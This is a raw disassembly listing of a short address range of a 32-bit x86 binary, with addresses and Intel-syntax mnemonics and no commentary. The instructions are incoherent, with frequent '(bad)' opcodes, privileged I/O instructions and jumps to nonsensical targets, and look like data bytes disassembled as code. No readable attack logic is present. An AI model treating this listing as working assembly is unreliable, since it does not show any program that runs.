  4274bb:	mov    ebx,0x38551912
  4274c0:	clc    
  4274c1:	cmc    
  4274c2:	dec    esp
  4274c3:	ds cli 
  4274c5:	(bad)  
  4274c6:	call   0xaa2af3eb
  4274cb:	mov    dl,0xf7
  4274cd:	inc    ebx
  4274ce:	test   al,0xe2
  4274d0:	jno    0x4274ff
  4274d2:	and    eax,0x6bd7be55
  4274d7:	fdecstp 
  4274d9:	cwde   
  4274da:	push   cs
  4274db:	push   es
  4274dc:	jecxz  0x4274f6
  4274de:	sbb    eax,0x6c7cc10b
  4274e3:	lea    ebx,[ecx-0x4c8bcb9]
  4274e9:	loopne 0x42746f
  4274eb:	mov    ebp,0x6fc39670
  4274f0:	stc    
  4274f1:	arpl   WORD PTR [edx+esi*8],bp
  4274f4:	adc    eax,0x9eac1427
  4274f9:	fwait
  4274fa:	test   BYTE PTR [ebp-0x3049f600],al
  427500:	mov    ebx,es
  427502:	sbb    bl,cl
  427504:	push   cs
  427505:	mov    ecx,0xbf73f985
  42750a:	(bad)  
  42750b:	jl     0x4274e0
  42750d:	jp     0x4274c6
  42750f:	icebp  
  427510:	inc    ecx
  427511:	arpl   WORD PTR [edx-0x5],di
  427514:	les    eax,FWORD PTR [eax]
  427516:	les    ebp,FWORD PTR [edi-0x74335afd]
  42751c:	dec    ebp
  42751d:	ss cmp al,0x13
  427520:	test   al,0x72
  427522:	add    dh,dl
  427524:	iret   
  427525:	push   cs
  427526:	pop    edx
  427527:	test   DWORD PTR [edi+esi*8],edx
  42752a:	mov    BYTE PTR [edx],bl
  42752c:	in     al,dx
  42752d:	push   esp
  42752e:	pop    es
  42752f:	and    al,0xe0
  427531:	sub    ecx,0x60
  427534:	cmc    
  427535:	inc    esi
  427536:	dec    edi
  427537:	ins    DWORD PTR es:[edi],dx
  427538:	xchg   ebp,eax
  427539:	mov    cl,bl
  42753b:	rcl    BYTE PTR [ecx-0x614d4aa9],cl
  427541:	dec    eax
  427542:	push   edx
  427543:	mov    dh,0x94
  427545:	sub    ebx,esp
  427547:	and    BYTE PTR [ebp-0x59],bl
  42754a:	push   ebx
  42754b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42754c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42754d:	add    al,0xa2
  42754f:	dec    DWORD PTR [ecx+0x4ce1b8b2]
  427555:	mov    al,0x5e
  427557:	fwait
  427558:	stos   DWORD PTR es:[edi],eax
  427559:	xchg   esp,eax
  42755a:	and    al,0x2d
  42755c:	mov    ebx,0x715d2b98
  427561:	mov    ds:0x805243b7,eax
  427566:	sub    eax,esp
  427568:	dec    esp
  427569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42756a:	adc    BYTE PTR [ecx+0x178d4db1],dh
  427570:	rol    BYTE PTR [eax+ecx*4-0x14150a4],1
  427577:	cmp    bh,BYTE PTR [edx]
  427579:	mov    ecx,0x9fc47696
  42757e:	jg     0x42756e
  427580:	pop    edi
  427581:	shl    DWORD PTR [edi+esi*2],1
  427584:	ins    DWORD PTR es:[edi],dx
  427585:	stc    
  427586:	test   eax,0xe851c49
  42758b:	ss out dx,eax
  42758d:	out    0x9d,eax
  42758f:	cld    
  427590:	call   0xbfc70a04
  427595:	xchg   esi,eax
  427596:	dec    edx
  427597:	test   DWORD PTR [edx],0x34c76538
  42759d:	adc    BYTE PTR [esi-0x323af012],bl
  4275a3:	scas   al,BYTE PTR es:[edi]
  4275a4:	scas   al,BYTE PTR es:[edi]
  4275a5:	stos   DWORD PTR es:[edi],eax
  4275a6:	call   0x9fbc:0x73802b07
  4275ad:	mov    eax,ds:0xb566bafe
  4275b2:	sar    DWORD PTR [esi+0x1f],1
  4275b5:	cmp    BYTE PTR [edi+0x50],ch
  4275b8:	fwait
  4275b9:	sub    BYTE PTR [eax+0x51343f9c],cl
  4275bf:	pop    ebp
  4275c0:	pusha  
  4275c1:	stos   BYTE PTR es:[edi],al
  4275c2:	jmp    0x9570fd51
  4275c7:	xchg   ebx,eax
  4275c8:	push   ebp
  4275c9:	arpl   WORD PTR [ebx+0x88be2bb],dx
  4275cf:	scas   eax,DWORD PTR es:[edi]
  4275d0:	popf   
  4275d1:	mov    ecx,0xacd02d30
  4275d6:	test   ch,al
  4275d8:	push   esp
  4275d9:	and    edx,DWORD PTR [ecx+ebp*1-0x8]
  4275dd:	ja     0x4275f8
  4275df:	mov    ah,0xfc
  4275e1:	cmp    DWORD PTR [eax+0x537cf9af],edi
  4275e7:	fcomi  st,st(7)
  4275e9:	dec    ebp
  4275ea:	outs   dx,DWORD PTR ds:[esi]
  4275eb:	pop    ebx
  4275ec:	sub    esp,DWORD PTR [ebx]
  4275ee:	or     DWORD PTR [ebx],esi
  4275f0:	mov    ch,0xd9
  4275f2:	push   ebx
  4275f3:	jmp    0x4275f7
  4275f5:	add    DWORD PTR [eax+edx*2],ebx
  4275f8:	xchg   esp,eax
  4275f9:	and    al,0x15
  4275fb:	push   eax
  4275fc:	je     0x427617
  4275fe:	jbe    0x4275af
  427600:	sub    ebx,DWORD PTR ds:0xe8435e12
  427606:	inc    esp
  427607:	pop    edx
  427608:	scas   eax,DWORD PTR es:[edi]
  427609:	mov    ch,0xe8
  42760b:	repz or ah,dh
  42760e:	jnp    0x4275e6
  427610:	inc    eax
  427611:	stos   BYTE PTR es:[edi],al
  427612:	ja     0x4275c9
  427614:	(bad)  
  427615:	cwde   
  427616:	enter  0xa05,0x8f
  42761a:	mov    al,BYTE PTR [edx+0x5cc5c66c]
  427620:	adc    al,BYTE PTR [esi-0x55]
  427623:	loopne 0x427635
  427625:	dec    esp
  427626:	fadd   QWORD PTR [esi+ecx*1+0x7c]
  42762a:	rol    BYTE PTR [edx],1
  42762c:	js     0x427632
  42762e:	stos   BYTE PTR es:[edi],al
  42762f:	jg     0x4275d2
  427631:	fs enter 0x5c2e,0x35
  427636:	push   ss
  427637:	shr    ch,0x83
  42763a:	mov    edx,0x1bcf2be9
  42763f:	jp     0x4276b0
  427641:	dec    ecx
  427642:	scas   eax,DWORD PTR es:[edi]
  427643:	mov    ds:0x33865d19,al
  427648:	in     al,dx
  427649:	outs   dx,BYTE PTR ds:[esi]
  42764a:	sbb    edi,DWORD PTR [eax]
  42764c:	cmp    edi,ecx
  42764e:	enterw 0x125,0x43
  427653:	ins    DWORD PTR es:[edi],dx
  427654:	lods   eax,DWORD PTR ds:[esi]
  427655:	(bad)  
  427657:	add    DWORD PTR [edx+ecx*8-0x28],edx
  42765b:	loop   0x4275ee
  42765d:	push   ds
  42765e:	mov    edx,0xbd034cc9
  427663:	loope  0x427683
  427665:	sbb    edx,DWORD PTR [ecx+0x252864e9]
  42766b:	push   ds
  42766c:	cli    
  42766d:	mov    edx,0x2aecfa8a
  427672:	fld    QWORD PTR [ebp+0x5]
  427675:	xor    eax,0x61ca9e08
  42767a:	fist   DWORD PTR [eax]
  42767c:	pop    edi
  42767d:	imul   ebx,DWORD PTR [esi],0x234844c3
  427683:	jge    0x427631
  427685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427686:	xchg   esp,eax
  427687:	arpl   dx,cx
  427689:	fistp  DWORD PTR [ebx-0x6d05731b]
  42768f:	addr16 dec edi
  427691:	sbb    al,0x17
  427693:	pop    esp
  427694:	cmp    bl,BYTE PTR [ebx-0x3af2fbd8]
  42769a:	retf   
  42769b:	popf   
  42769c:	sbb    eax,0xe510900f
  4276a1:	jg     0x42765f
  4276a3:	nop    esi
  4276a6:	in     al,dx
  4276a7:	shl    BYTE PTR [ebx+0x3d],0xf1
  4276ab:	cld    
  4276ac:	cmc    
  4276ad:	or     BYTE PTR [eax+ebx*4+0x13],ch
  4276b1:	pop    ebp
  4276b2:	sub    eax,0x9c90db13
  4276b7:	enter  0x5d1f,0x3
  4276bb:	aaa    
  4276bc:	dec    ebp
  4276bd:	add    BYTE PTR [eax],al
  4276bf:	add    BYTE PTR [eax],al
  4276c1:	add    BYTE PTR [edx],cl
  4276c3:	les    esp,FWORD PTR [ecx+0x5ef7eff7]
  4276c9:	std    
  4276ca:	mov    ebp,0x98f91c3b
  4276cf:	gs mov ecx,0x1ee9423
  4276d5:	add    bl,dh
  4276d7:	add    al,0x0
  4276d9:	add    bl,bh
  4276db:	mov    es,eax
  4276dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276de:	fcmovb st,st(7)
  4276e0:	xchg   BYTE PTR [eax-0x1b31f5b5],al
  4276e6:	lds    esp,FWORD PTR [ecx]
  4276e8:	mov    ds:0xe424f3d2,eax
  4276ed:	xchg   esp,eax
  4276ee:	arpl   cx,ax
  4276f0:	xlat   BYTE PTR ds:[ebx]
  4276f1:	sbb    DWORD PTR [ecx+0x42],eax
  4276f4:	fcomi  st,st(1)
  4276f6:	test   DWORD PTR [ebp-0x5f3535bf],edx
  4276fc:	adc    BYTE PTR [eax],al
  4276fe:	icebp  
  4276ff:	jb     0x427725
  427701:	adc    al,BYTE PTR [esp+esi*4-0x1a]
  427705:	popa   
  427706:	push   ss
  427707:	mov    sp,0x7ff6
  42770b:	aaa    
  42770c:	mov    al,0x11
  42770e:	inc    ebp
  42770f:	inc    ecx
  427710:	mov    edx,fs
  427712:	mov    esi,0xfe0f2b28
  427717:	in     eax,0x10
  427719:	pop    ebp
  42771a:	jge    0x4276c8
  42771c:	pop    esi
  42771d:	inc    edx
  42771e:	jns    0x427771
  427720:	dec    edx
  427721:	or     edx,DWORD PTR [eax+0x1a]
  427724:	rol    dh,1
  427726:	shl    DWORD PTR [eax],0x6c
  427729:	aad    0x13
  42772b:	inc    ebp
  42772c:	jb     0x4276ee
  42772e:	xchg   DWORD PTR [edi],edi
  427730:	pop    edx
  427731:	xchg   DWORD PTR [esi-0x33],edx
  427734:	adc    eax,0xfa806fe2
  427739:	jge    0x4276ce
  42773b:	ror    BYTE PTR [edx-0x23cdcde2],0x31
  427742:	shl    DWORD PTR [esi],0xaa
  427745:	xchg   BYTE PTR [edi],ch
  427747:	mov    edx,0x9d20346e
  42774c:	nop
  42774d:	jbe    0x4276d7
  42774f:	push   ecx
  427750:	cmp    DWORD PTR [ecx-0x54],0xfffffff7
  427754:	sbb    edi,DWORD PTR [ebx]
  427756:	and    eax,0xae4c827a
  42775b:	ja     0x42776b
  42775d:	imul   eax,edx,0x777f306
  427763:	or     cl,bl
  427765:	inc    eax
  427766:	add    DWORD PTR gs:[ecx-0x270961f3],ebx
  42776d:	jb     0x4277cb
  42776f:	shl    BYTE PTR [edi+0x18],0x78
  427773:	pop    eax
  427774:	mov    eax,ds:0x9efcf89f
  427779:	lods   al,BYTE PTR ds:[esi]
  42777a:	push   ecx
  42777b:	xchg   ebx,eax
  42777c:	dec    esp
  42777d:	ror    BYTE PTR ds:0x16e4fe59,0x8c
  427784:	sub    DWORD PTR [ebp-0x5ce7566e],esp
  42778a:	add    BYTE PTR [ecx-0x68],bh
  42778d:	jb     0x42776a
  42778f:	fs jmp edi
  427792:	cs ins DWORD PTR es:[edi],dx
  427794:	scas   al,BYTE PTR es:[edi]
  427795:	rol    edi,cl
  427797:	inc    esi
  427798:	sub    BYTE PTR [edx],0xe9
  42779b:	pop    edx
  42779c:	dec    edx
  42779d:	ins    BYTE PTR es:[edi],dx
  42779e:	sub    DWORD PTR [edi+esi*4-0x54a0410d],edx
  4277a5:	or     eax,0x6936fd7a
  4277aa:	inc    ebp
  4277ab:	loop   0x427818
  4277ad:	dec    ecx
  4277ae:	or     BYTE PTR [ebx],ch
  4277b0:	jecxz  0x4277b5
  4277b2:	or     al,0x47
  4277b4:	jle    0x427789
  4277b6:	dec    ebx
  4277b7:	push   ss
  4277b8:	leave  
  4277b9:	pop    ebp
  4277ba:	cs jns 0x427829
  4277bd:	hlt    
  4277be:	enter  0xea7d,0x7f
  4277c2:	cmp    ecx,ebp
  4277c4:	retf   
  4277c5:	push   ecx
  4277c6:	std    
  4277c7:	stos   DWORD PTR es:[edi],eax
  4277c8:	pop    eax
  4277c9:	jle    0x4277c2
  4277cb:	je     0x4277c4
  4277cd:	mov    al,0x66
  4277cf:	les    esi,FWORD PTR [ebx+0x62]
  4277d2:	sbb    DWORD PTR [edx+0x7e],0xffffffad
  4277d6:	outs   dx,BYTE PTR ds:[esi]
  4277d7:	add    dl,BYTE PTR [esi]
  4277d9:	mov    dl,0x9
  4277db:	stos   BYTE PTR es:[edi],al
  4277dc:	and    eax,DWORD PTR [eax+0x252e0646]
  4277e2:	sbb    al,0xff
  4277e4:	xchg   edi,eax
  4277e5:	das    
  4277e6:	xor    BYTE PTR [edi],0x47
  4277e9:	(bad)
  4277ec:	rcr    BYTE PTR [ecx],1
  4277ee:	in     eax,0xb2
  4277f0:	mov    edi,0x6d4bcbc5
  4277f5:	out    dx,al
  4277f6:	mov    fs,WORD PTR [edi+0x312fe4bb]
  4277fc:	dec    esp
  4277fd:	mov    ecx,0x257ad41c
  427802:	scas   al,BYTE PTR es:[edi]
  427803:	pushf  
  427804:	push   esi
  427805:	add    BYTE PTR [esi+edx*2],bl
  427808:	cmp    al,0x3c
  42780a:	les    ecx,FWORD PTR [edx]
  42780c:	popa   
  42780d:	ja     0x427829
  42780f:	xchg   edx,eax
  427810:	je     0x4277bf
  427812:	pop    ecx
  427813:	aaa    
  427814:	sahf   
  427815:	and    al,BYTE PTR [ebx]
  427817:	add    dh,ch
  427819:	call   0xb5fbc2f0
  42781e:	into   
  42781f:	scas   eax,DWORD PTR es:[edi]
  427820:	mov    cl,0x47
  427822:	pop    edx
  427823:	adc    eax,0x249867cf
  427828:	pop    edx
  427829:	outs   dx,BYTE PTR ds:[esi]
  42782a:	popa   
  42782b:	mov    ebp,0x8141811
  427830:	jne    0x4277fc
  427832:	cli    
  427833:	aam    0xbf
  427835:	loopne 0x427805
  427837:	scas   al,BYTE PTR es:[edi]
  427838:	sbb    eax,0xdcf206db
  42783d:	call   0x7c3b:0xe3230c83
  427844:	scas   al,BYTE PTR es:[edi]
  427845:	(bad)  
  427846:	cmc    
  427847:	fld    QWORD PTR [edx-0x2fd6b77f]
  42784d:	(bad)  
  42784e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42784f:	pop    ss
  427850:	sbb    al,0xe3
  427852:	push   ecx
  427853:	mov    esi,0x3d68817
  427858:	dec    ebx
  427859:	xlat   BYTE PTR ds:[ebx]
  42785a:	xchg   esi,eax
  42785b:	int    0x6e
  42785d:	imul   ebx,DWORD PTR [esi],0x75
  427860:	mov    DWORD PTR [edx-0x4c],eax
  427863:	mov    al,0x33
  427865:	inc    ecx
  427866:	dec    edx
  427867:	in     eax,dx
  427868:	adc    DWORD PTR [ecx],esp
  42786a:	loopne 0x427886
  42786c:	add    BYTE PTR [ebx+eax*4],dh
  42786f:	lahf   
  427870:	pop    ecx
  427871:	bound  edi,QWORD PTR [esi]
  427873:	loop   0x427896
  427875:	add    bl,BYTE PTR [ecx+0x94a589d]
  42787b:	or     ecx,ecx
  42787d:	out    0x25,al
  42787f:	int    0x8f
  427881:	push   edi
  427882:	sahf   
  427883:	jno    0x427892
  427885:	je     0x42787d
  427887:	(bad)
  42788b:	pusha  
  42788c:	bound  eax,QWORD PTR [eax+0x63e832bc]
  427892:	in     eax,0x7e
  427894:	les    ebp,FWORD PTR [ebx-0x1c]
  427897:	aaa    
  427898:	pop    edx
  427899:	push   es
  42789a:	outs   dx,DWORD PTR ds:[esi]
  42789b:	in     eax,0x33
  42789d:	jbe    0x427822
  42789f:	sar    cl,0x96
  4278a2:	outs   dx,BYTE PTR ds:[esi]
  4278a3:	cld    
  4278a4:	rcr    BYTE PTR [edx+esi*1],cl
  4278a7:	stos   BYTE PTR es:[edi],al
  4278a8:	ror    BYTE PTR [edi+0x8faa901],0x50
  4278af:	(bad)  
  4278b0:	repz adc edx,DWORD PTR [esi-0x11]
  4278b4:	mov    al,ds:0xdac614d9
  4278b9:	xchg   ebp,eax
  4278ba:	push   ss
  4278bb:	push   edx
  4278bc:	ds (bad) 
  4278be:	(bad)  
  4278bf:	stos   BYTE PTR es:[edi],al
  4278c0:	(bad)  
  4278c1:	addr16 inc eax
  4278c3:	pop    ds
  4278c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278c5:	sub    eax,0xf911d5af
  4278ca:	das    
  4278cb:	aaa    
  4278cc:	(bad)  [ecx+eiz*1+0x6e]
  4278d0:	ins    DWORD PTR es:[edi],dx
  4278d1:	std    
  4278d2:	les    ecx,FWORD PTR [esi]
  4278d4:	add    DWORD PTR [ebx+0x41],ebx
  4278d7:	enter  0xdead,0xaa
  4278db:	fisttp DWORD PTR [edx+0x61]
  4278de:	mov    bl,0x8a
  4278e0:	fist   WORD PTR [eax-0x1e]
  4278e3:	inc    edi
  4278e4:	xchg   esp,eax
  4278e5:	mov    ds:0x221c0f22,al
  4278ea:	fdiv   QWORD PTR [ebp+0xb]
  4278ed:	or     eax,0x4291a3d5
  4278f2:	xchg   ebx,eax
  4278f3:	rcl    BYTE PTR [eax-0x74],1
  4278f6:	cli    
  4278f7:	add    al,0xc5
  4278f9:	cmp    al,0x4b
  4278fb:	retf   0xb80a
  4278fe:	mov    esi,0x81276974
  427903:	gs fcmovu st,st(0)
  427906:	push   bp
  427908:	daa    
  427909:	add    dh,bl
  42790b:	inc    ebp
  42790c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42790d:	jl     0x4278c9
  42790f:	retf   0x7e96
  427912:	hlt    
  427913:	les    edi,FWORD PTR ds:0x3c99a03b
  427919:	xchg   ebp,eax
  42791a:	rcr    DWORD PTR [ebx],1
  42791c:	int    0x6
  42791e:	jmp    0x427948
  427920:	in     al,dx
  427921:	lea    eax,[ebx+0xb]
  427924:	xlat   BYTE PTR ds:[ebx]
  427925:	jb     0x4278b4
  427927:	mov    edx,0x6d46f7df
  42792c:	pop    es
  42792d:	pop    ds
  42792e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42792f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427930:	push   es
  427931:	pop    ds
  427932:	cmp    esi,eax
  427934:	adc    BYTE PTR [ebp+0x2878f1c2],dl
  42793a:	inc    eax
  42793b:	push   edi
  42793c:	mov    WORD PTR [edi],ss
  42793e:	fistp  DWORD PTR [edi-0x66b57089]
  427944:	add    eax,0x5db8a4f
  427949:	xlat   BYTE PTR ds:[ebx]
  42794a:	mov    WORD PTR [edi],cs
  42794c:	mov    bh,0x5f
  42794e:	sbb    DWORD PTR [ebx+0x2a],esp
  427951:	stos   DWORD PTR es:[edi],eax
  427952:	sbb    BYTE PTR ds:[edx-0x3f],ch
  427956:	setnp  BYTE PTR [ecx]
  427959:	call   FWORD PTR [edx+0x1b8c2dfa]
  42795f:	out    dx,eax
  427960:	push   0x1b
  427962:	rcl    al,cl
  427964:	adc    ah,cl
  427966:	addr16 js 0x42798b
  427969:	fcom   DWORD PTR [edx+0x17]
  42796c:	mov    edi,0xf3a6264d
  427971:	fidivr DWORD PTR [edi]
  427973:	sub    BYTE PTR [edx-0x10],ah
  427976:	mov    bh,0x2c
  427978:	sbb    BYTE PTR [eax-0x207ae09d],bl
  42797e:	fsub   QWORD PTR [ebp+eax*1-0x29]
  427982:	mov    gs,WORD PTR [ecx]
  427984:	jg     0x427948
  427986:	pop    ebx
  427987:	fs push cs
  427989:	add    BYTE PTR [ebp-0x417c5b29],ch
  42798f:	mov    WORD PTR [eax+0x33],ds
  427992:	xchg   edx,eax
  427993:	test   eax,0xa1c7aaee
  427998:	jb     0x42793f
  42799a:	adc    dl,BYTE PTR [edi]
  42799c:	xor    DWORD PTR [esi+0x670cd9b5],0x3
  4279a3:	je     0x42795b
  4279a5:	addr16 xchg ecx,eax
  4279a7:	(bad)  
  4279a8:	pop    eax
  4279a9:	sbb    esi,DWORD PTR [ecx+0x287195d4]
  4279af:	pop    esp
  4279b0:	les    ecx,FWORD PTR [ebx]
  4279b2:	in     eax,dx
  4279b3:	pushf  
  4279b4:	addr16 xchg ebp,eax
  4279b6:	xchg   esp,eax
  4279b7:	pop    esi
  4279b8:	popf   
  4279b9:	sub    ecx,DWORD PTR [ebx+0x16]
  4279bc:	push   ecx
  4279bd:	lea    eax,[esi-0x73]
  4279c0:	inc    edi
  4279c1:	pop    ds
  4279c2:	shl    ecx,0xf5
  4279c5:	and    esp,esp
  4279c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279c8:	mov    ?,WORD PTR [edi+0x2cdc5f58]
  4279ce:	xor    al,0x46
  4279d0:	push   DWORD PTR [ecx-0x65aacc3]
  4279d6:	fisub  DWORD PTR [ebx*1-0x6684fbe8]
  4279dd:	ss ins DWORD PTR es:[edi],dx
  4279df:	pop    esi
  4279e0:	inc    ecx
  4279e1:	push   0xfffffffd
  4279e3:	jb     0x427980
  4279e5:	sub    eax,0x2c47f03e
  4279ea:	cmc    
  4279eb:	pop    esp
  4279ec:	aam    0xfa
  4279ee:	imul   BYTE PTR [ebx+0x10ff7b24]
  4279f4:	in     al,dx
  4279f5:	lds    esi,FWORD PTR [ecx+edx*1]
  4279f8:	dec    eax
  4279f9:	push   ebx
  4279fa:	xlat   BYTE PTR ds:[ebx]
  4279fb:	inc    esp
  4279fc:	outs   dx,DWORD PTR ds:[esi]
  4279fd:	je     0x427a32
  4279ff:	int3   
  427a00:	pop    ebx
  427a01:	int3   
  427a02:	scas   al,BYTE PTR es:[edi]
  427a03:	cmp    al,0xf4
  427a05:	test   al,0x0
  427a07:	pop    ss
  427a08:	pop    esp
  427a09:	xchg   edx,eax
  427a0a:	inc    eax
  427a0b:	jmp    DWORD PTR [eax]
  427a0d:	mov    ebx,0x2cf3ad3d
  427a12:	in     eax,dx
  427a13:	lods   al,BYTE PTR ds:[esi]
  427a14:	fsubr  QWORD PTR [ebx-0x25d00aa4]
  427a1a:	mov    esp,DWORD PTR [esi+edx*2-0x3a1693be]
  427a21:	push   esp
  427a22:	ss xlat BYTE PTR gs:[ebx]
  427a25:	add    esi,DWORD PTR [edx-0x27318961]
  427a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a2c:	aas    
  427a2d:	dec    esi
  427a2e:	iret   
  427a2f:	xchg   eax,ebx
  427a31:	jb     0x4279bb
  427a33:	in     al,dx
  427a34:	fucomi st,st(2)
  427a36:	loop   0x427a7a
  427a38:	jecxz  0x427a46
  427a3a:	add    BYTE PTR [esi],cl
  427a3c:	dec    ebp
  427a3d:	adc    eax,esi
  427a3f:	xor    ch,BYTE PTR [ebx]
  427a41:	inc    eax
  427a42:	dec    edx
  427a43:	test   al,0x7d
  427a45:	ins    DWORD PTR es:[edi],dx
  427a46:	and    al,0xef
  427a48:	xor    ecx,esi
  427a4a:	xor    edx,DWORD PTR [ebx]
  427a4c:	xchg   esi,eax
  427a4d:	mov    cl,0xb8
  427a4f:	mov    eax,0xc9f14d2
  427a54:	mov    bl,0x5
  427a56:	or     BYTE PTR [eax-0x4f],ch
  427a59:	or     DWORD PTR [edi+0x6a],0x4f
  427a5d:	add    al,0xcb
  427a5f:	jmp    0x34734e8c
  427a64:	sbb    bh,BYTE PTR [edi+0x7ab0a09d]
  427a6a:	cdq    
  427a6b:	mov    dl,0x5b
  427a6d:	loop   0x427a56
  427a6f:	ins    BYTE PTR es:[edi],dx
  427a70:	jmp    0x3672e060
  427a75:	xchg   ah,ah
  427a77:	sbb    al,0x61
  427a79:	add    eax,0x56edd3d3
  427a7e:	in     al,0xb4
  427a80:	js     0x427acc
  427a82:	jo     0x427a4a
  427a84:	out    0x2b,al
  427a86:	mov    ebp,0x13dd741d
  427a8b:	aad    0xcf
  427a8d:	or     eax,0x541ba8a8
  427a92:	xchg   ebp,eax
  427a93:	sub    bl,BYTE PTR [eax-0x45925835]
  427a99:	xchg   DWORD PTR [ecx+0x70de871],ebp
  427a9f:	loop   0x427a8c
  427aa1:	or     al,0x65
  427aa3:	add    bh,BYTE PTR [ebp+esi*2-0x46a2515d]
  427aaa:	clc    
  427aab:	cld    
  427aac:	(bad)  
  427aad:	xor    ebp,edx
  427aaf:	push   edx
  427ab0:	ret    0x1e6
  427ab3:	inc    edx
  427ab4:	xchg   edi,esp
  427ab6:	(bad)  
  427ab8:	retf   0x805e
  427abb:	jbe    0x427a72
  427abd:	cmp    al,0xfa
  427abf:	xchg   esp,eax
  427ac0:	or     BYTE PTR [ebx+0x61],ch
  427ac3:	clc    
  427ac4:	out    dx,al
  427ac5:	sub    eax,0x962a7df1
  427aca:	mov    ebp,0x15d4f319
  427acf:	xlat   BYTE PTR ds:[ebx]
  427ad0:	sub    esp,DWORD PTR [ebx+ebx*8-0x4c]
  427ad4:	(bad)  
  427ad5:	retf   0x69bf
  427ad8:	js     0x427abc
  427ada:	inc    ecx
  427adb:	xor    dl,al
  427add:	int3   
  427ade:	or     eax,0x75b63763
  427ae3:	ds xchg edx,eax
  427ae5:	mov    edi,0xcbede322
  427aea:	scas   eax,DWORD PTR es:[edi]
  427aeb:	push   edi
  427aec:	(bad)  
  427aed:	lock call 0x3681:0x3c68615d
  427af5:	fcmovb st,st(3)
  427af7:	or     bh,0x9c
  427afa:	mov    dl,0xb7
  427afc:	mov    ah,0xb9
  427afe:	in     eax,dx
  427aff:	popa   
  427b00:	xchg   ebx,eax
  427b01:	sbb    dl,BYTE PTR [ebx+0x7f]
  427b04:	cwde   
  427b05:	add    eax,0xde86c948
  427b0a:	lock lods al,BYTE PTR ds:[esi]
  427b0c:	cmp    DWORD PTR [eax-0x7e66a73e],0x35
  427b13:	push   ss
  427b14:	es jg  0x427b48
  427b17:	sar    DWORD PTR [edi+eax*8+0x4b],cl
  427b1b:	xlat   BYTE PTR ds:[ebx]
  427b1c:	pushf  
  427b1d:	js     0x427b47
  427b1f:	xchg   ebx,eax
  427b20:	xor    ebx,eax
  427b22:	sbb    DWORD PTR [ebx-0x338e837e],esp
  427b28:	fdivr  QWORD PTR [eax]
  427b2a:	mov    es,WORD PTR [eax+0x47]
  427b2d:	or     eax,0x4f0e0df2
  427b32:	mov    eax,edi
  427b34:	loop   0x427b9d
  427b36:	rcl    BYTE PTR ds:0x5709a661,cl
  427b3c:	dec    esp
  427b3d:	(bad)  
  427b3e:	jecxz  0x427b6c
  427b40:	popf   
  427b41:	and    ecx,DWORD PTR [ebx]
  427b43:	lods   eax,DWORD PTR ds:[esi]
  427b44:	popa   
  427b45:	les    ebx,FWORD PTR [esi*2+0x71c1719a]
  427b4c:	add    BYTE PTR [esi+0x4f],dl
  427b4f:	inc    esp
  427b50:	and    edx,edx
  427b52:	or     al,0xba
  427b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b55:	pop    es
  427b56:	sbb    eax,0x69a86195
  427b5b:	outs   dx,BYTE PTR ds:[esi]
  427b5c:	fsub   DWORD PTR [edx]
  427b5e:	aam    0x8c
  427b60:	jae    0x427bbb
  427b62:	sub    DWORD PTR [edx-0xd],edi
  427b65:	jg     0x427bc6
  427b67:	dec    esp
  427b68:	xchg   edx,eax
  427b69:	(bad)  
  427b6b:	xchg   esp,eax
  427b6c:	inc    ebx
  427b6d:	hlt    
  427b6e:	xchg   ecx,esp
  427b70:	fstp   TBYTE PTR [ecx-0x7e]
  427b73:	enter  0xd615,0x2e
  427b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b78:	ficom  WORD PTR ds:0x6f674298
  427b7e:	rcr    BYTE PTR cs:0x41950978,1
  427b85:	push   ss
  427b86:	ret    0x8f66
  427b89:	js     0x427b60
  427b8b:	popa   
  427b8c:	mov    ecx,0x1398b84a
  427b91:	mov    eax,ds:0xc5e3613a
  427b96:	and    edx,DWORD PTR [edx+ebp*4]
  427b99:	push   0x47
  427b9b:	mov    ch,0xba
  427b9d:	cmc    
  427b9e:	or     BYTE PTR [ecx+0x4dbc7d93],cl
  427ba4:	retf   0x197b
  427ba7:	dec    ecx
  427ba8:	inc    eax
  427ba9:	add    ah,BYTE PTR [edi+eax*2+0x12a00cc3]
  427bb0:	outs   dx,DWORD PTR ds:[esi]
  427bb1:	xor    DWORD PTR [ebx],edi
  427bb3:	push   0xffffffb5
  427bb5:	mov    edx,0xe820a1cb
  427bba:	retf   
  427bbb:	mov    cl,BYTE PTR [edx]
  427bbd:	or     eax,0x123b5965
  427bc2:	mov    ecx,0x151f2a7
  427bc7:	pop    esi
  427bc8:	mov    eax,0xb9551654
  427bcd:	add    BYTE PTR [eax],al
  427bcf:	add    BYTE PTR [eax],al
  427bd1:	add    BYTE PTR [edi-0xa],dh
  427bd4:	push   ecx
  427bd5:	dec    edi
  427bd6:	shr    edi,1
  427bd8:	jg     0x427bd8
  427bda:	push   cs
  427bdb:	mov    edi,0x465fe2d0
  427be0:	adc    DWORD PTR [edi],ebp
  427be2:	xchg   ebx,esi
  427be4:	add    DWORD PTR [eax],eax
  427be6:	repz add al,0x0
  427be9:	add    BYTE PTR [ecx+0x6ba36c87],bl
  427bef:	enter  0xa3d,0x41
  427bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bf4:	adc    ch,dl
  427bf6:	mov    ah,0x7a
  427bf8:	adc    BYTE PTR [ecx],bl
  427bfa:	and    BYTE PTR [ebx],0x6a
  427bfd:	scas   eax,DWORD PTR es:[edi]
  427bfe:	mov    dh,0xb8
  427c00:	std    
  427c01:	into   
  427c02:	mov    al,ds:0x5faf5807
  427c07:	imul   edi,DWORD PTR [esi],0x14ae1f9e
  427c0d:	add    DWORD PTR [edi-0x199a0c61],esp
  427c13:	push   ebx
  427c14:	int3   
  427c15:	xchg   BYTE PTR [ebx-0x7151a464],cl
  427c1b:	popf   
  427c1c:	and    DWORD PTR fs:[ebp+eax*8+0x56],ebx
